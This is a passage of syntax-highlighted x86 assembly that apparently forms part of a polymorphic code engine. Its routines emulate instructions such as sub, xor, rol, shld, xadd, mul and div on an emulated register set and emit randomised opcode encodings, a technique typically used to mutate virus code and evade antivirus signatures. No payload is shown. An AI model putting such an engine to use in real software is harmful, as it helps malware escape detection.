</span><span class="sc5">@@x_sub_c</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_SUB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2DE881h</span><span class="sc0">            </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@try_short</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">     </span><span class="sc1">; emul -- sub r1, c</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@checkshort</span><span class="sc0">

</span><span class="sc5">@@x_xor_c</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_XOR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35F081h</span><span class="sc0">            </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@try_short</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">     </span><span class="sc1">; emul -- xor r1, c</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@checkshort</span><span class="sc0">

</span><span class="sc5">@@x_and_c</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_AND</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25E081h</span><span class="sc0">            </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@try_short</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">     </span><span class="sc1">; emul -- and r1, c</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@checkshort</span><span class="sc0">

</span><span class="sc5">@@x_or_c</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_OR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DC881h</span><span class="sc0">            </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@try_short</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">     </span><span class="sc1">; emul -- or  r1, c</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@checkshort</span><span class="sc0">

</span><span class="sc5">@@try_short</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOSHORT_C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@try_short_retn</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@try_short_retn</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">; 81-&gt;83</span><span class="sc0">
                        </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc5">XXX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">XXX_8</span><span class="sc0">
</span><span class="sc5">@@try_short_retn</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">@@x_rol_c</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_ROL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@modarg</span><span class="sc0">                </span><span class="sc1">; modify argument</span><span class="sc0">
                        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">      </span><span class="sc1">; emul -- rol r1, c</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0C1h</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw_stosbX</span><span class="sc0">

</span><span class="sc5">@@x_ror_c</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_ROR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@modarg</span><span class="sc0">                </span><span class="sc1">; modify argument</span><span class="sc0">
                        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">      </span><span class="sc1">; emul -- ror r1, c</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C8C1h</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw_stosbX</span><span class="sc0">

</span><span class="sc5">@@x_imul_ex</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_IMUL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- imul r1, r2</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AF0Fh</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">REG1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG2</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosw_modrm</span><span class="sc0">

</span><span class="sc5">@@x_imul_ex_c</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_IMUL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- imul r1,r2,c</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">69h</span><span class="sc0">                 </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">REG1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG2</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosb_modrm_stosd</span><span class="sc0">

</span><span class="sc5">@@x_shld</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_SHLD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@modarg</span><span class="sc0">                </span><span class="sc1">; modify argument</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- shld r1,r2,c</span><span class="sc0">
                        </span><span class="sc6">shld</span><span class="sc0">    </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A40Fh</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosw_modrm_stosbX</span><span class="sc0">

</span><span class="sc5">@@x_shrd</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_SHRD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@modarg</span><span class="sc0">                </span><span class="sc1">; modify argument</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- shrd r1,r2,c</span><span class="sc0">
                        </span><span class="sc6">shrd</span><span class="sc0">    </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AC0Fh</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosw_modrm_stosbX</span><span class="sc0">

</span><span class="sc5">@@x_btc_c</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_BTC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@modarg</span><span class="sc0">                </span><span class="sc1">; modify argument</span><span class="sc0">
                        </span><span class="sc6">btc</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">     </span><span class="sc1">; emul -- btc r1, c</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8ba0fh</span><span class="sc0">           </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stos3or</span><span class="sc0">

</span><span class="sc5">@@x_btr_c</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_BTR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@modarg</span><span class="sc0">                </span><span class="sc1">; modify argument</span><span class="sc0">
                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">     </span><span class="sc1">; emul -- btr r1, c</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0ba0fh</span><span class="sc0">           </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stos3or</span><span class="sc0">

</span><span class="sc5">@@x_bts_c</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_BTS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@modarg</span><span class="sc0">                </span><span class="sc1">; modify argument</span><span class="sc0">
                        </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">     </span><span class="sc1">; emul -- bts r1, c</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8ba0fh</span><span class="sc0">           </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stos3or</span><span class="sc0">

</span><span class="sc5">@@x_bswap</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_BSWAP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- bswap r1</span><span class="sc0">
                        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c80fh</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw</span><span class="sc0">

</span><span class="sc5">@@x_xadd</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_XADD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG2</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; emul -- xadd r1,r2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">xadd</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C10Fh</span><span class="sc0">              </span><span class="sc1">; opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosw_modrm</span><span class="sc0">

</span><span class="sc5">@@x_bsr</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_BSR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">bsr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BD0Fh</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">REG1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG2</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosw_modrm</span><span class="sc0">

</span><span class="sc5">@@x_bsf</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_BSF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">bsf</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BC0Fh</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">REG1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG2</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@stosw_modrm</span><span class="sc0">

</span><span class="sc5">@@md_init</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regavail</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_EAX</span><span class="sc4">+</span><span class="sc5">REG_EDX</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_EAX</span><span class="sc4">+</span><span class="sc5">REG_EDX</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@md_sux</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">reginit</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_EAX</span><span class="sc4">+</span><span class="sc5">REG_EDX</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_EAX</span><span class="sc4">+</span><span class="sc5">REG_EDX</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@md_sux</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_EAX</span><span class="sc4">+</span><span class="sc5">REG_EDX</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@md_sux</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG_EAX_N</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG_EDX_N</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">@@md_sux</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; return address</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc5">@@md_done</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG_EAX_N</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG_EDX_N</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">@@x_mul</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_MUL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@md_init</span><span class="sc0">
                        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@md_done</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0F7h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw</span><span class="sc0">

</span><span class="sc5">@@x_imul</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_IMUL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@md_init</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@md_done</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8F7h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw</span><span class="sc0">

</span><span class="sc5">@@x_div</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_DIV</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@md_init</span><span class="sc0">
                        </span><span class="sc1">;; check if DIV avail</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
